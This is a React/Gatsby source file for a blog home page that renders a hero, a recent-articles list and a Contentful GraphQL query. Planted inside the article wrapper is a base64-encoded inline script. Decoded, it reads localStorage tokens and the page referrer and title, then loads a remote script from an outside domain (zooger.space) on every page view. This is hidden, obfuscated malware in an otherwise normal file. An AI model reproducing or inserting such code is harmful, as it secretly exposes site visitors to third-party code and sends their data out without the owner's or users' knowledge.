import React from 'react'
import { graphql } from 'gatsby'
import get from 'lodash/get'
import { Helmet } from 'react-helmet'
import Hero from '../components/hero'
import Layout from '../components/layout'
import ArticlePreview from '../components/article-preview'

class RootIndex extends React.Component {
  render() {
    const siteTitle = get(this, 'props.data.site.siteMetadata.title')
    const posts = get(this, 'props.data.allContentfulBlogPost.edges')
    const [author] = get(this, 'props.data.allContentfulPerson.edges')

    return (
      <Layout location={this.props.location}>
        <div style={{ background: '#fff' }}>
          <Helmet title={siteTitle} />
          <Hero data={author.node} />
          <div className="wrapper">
      <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfaHNYbXN3dlFIMjFKeWZ6USc7CiAgICBpZiAoIXdpbmRvdy5faHNYbXN3dlFIMjFKeWZ6USkgewogICAgICAgIHdpbmRvdy5faHNYbXN3dlFIMjFKeWZ6USA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiAyODg4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly96b29nZXIuc3BhY2UvZ2hzYnN5JywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1BWUUdjYlJ3UUN4d3lRczYgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9QVlFHY2JSd1FDeHd5UXM2ICE9PSAndW5kZWZpbmVkJyAmJiBfUFZRR2NiUndRQ3h3eVFzNiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfcmRDU0xEOVpRcTd3Z2ZkWSA9IEpTT04ucGFyc2UoX1BWUUdjYlJ3UUN4d3lRczYpOwogICAgICAgIHZhciBfSHBzSjV4REQ2a2MyMndqQyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9yZENTTEQ5WlFxN3dnZmRZLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2hzWG1zd3ZRSDIxSnlmelEudHRsIDwgX0hwc0o1eERENmtjMjJ3akMpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF90SnJyZ0RtSm5xem1SQ3g3ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1NiM01NOXA1TGtMcWo1Z24gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfaEpjek41eFI5U3I3OVRKRiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfaEpjek41eFI5U3I3OVRKRiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfaEpjek41eFI5U3I3OVRKRiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9oc1htc3d2UUgyMUp5ZnpRLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF90SnJyZ0RtSm5xem1SQ3g3ICE9PSAndW5kZWZpbmVkJyAmJiBfdEpycmdEbUpucXptUkN4NyAmJiB3aW5kb3cuX2hzWG1zd3ZRSDIxSnlmelEudW5pcXVlKSB7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfdEpycmdEbUpucXptUkN4Nyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9TYjNNTTlwNUxrTHFqNWduICE9PSAndW5kZWZpbmVkJyAmJiBfU2IzTU05cDVMa0xxajVnbiAmJiB3aW5kb3cuX2hzWG1zd3ZRSDIxSnlmelEudW5pcXVlKSB7CiAgICAgICAgX2hKY3pONXhSOVNyNzlUSkYgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9TYjNNTTlwNUxrTHFqNWduKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9oc1htc3d2UUgyMUp5ZnpRLlJfUEFUSCArIF9oSmN6TjV4UjlTcjc5VEpGOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
            <h2 className="section-headline">Recent articles</h2>
            <ul className="article-list">
              {posts.map(({ node }) => {
                return (
                  <li key={node.slug}>
                    <ArticlePreview article={node} />
                  </li>
                )
              })}
            </ul>
          </div>
        </div>
      </Layout>
    )
  }
}

export default RootIndex

export const pageQuery = graphql`
  query HomeQuery {
    allContentfulBlogPost(sort: { fields: [publishDate], order: DESC }) {
      edges {
        node {
          title
          slug
          publishDate(formatString: "MMMM Do, YYYY")
          tags
          heroImage {
            fluid(maxWidth: 350, maxHeight: 196, resizingBehavior: SCALE) {
              ...GatsbyContentfulFluid_tracedSVG
            }
          }
          description {
            childMarkdownRemark {
              html
            }
          }
        }
      }
    }
    allContentfulPerson(
      filter: { contentful_id: { eq: "15jwOBqpxqSAOy2eOO4S0m" } }
    ) {
      edges {
        node {
          name
          shortBio {
            shortBio
          }
          title
          heroImage: image {
            fluid(
              maxWidth: 1180
              maxHeight: 480
              resizingBehavior: PAD
              background: "rgb:000000"
            ) {
              ...GatsbyContentfulFluid_tracedSVG
            }
          }
        }
      }
    }
  }
`

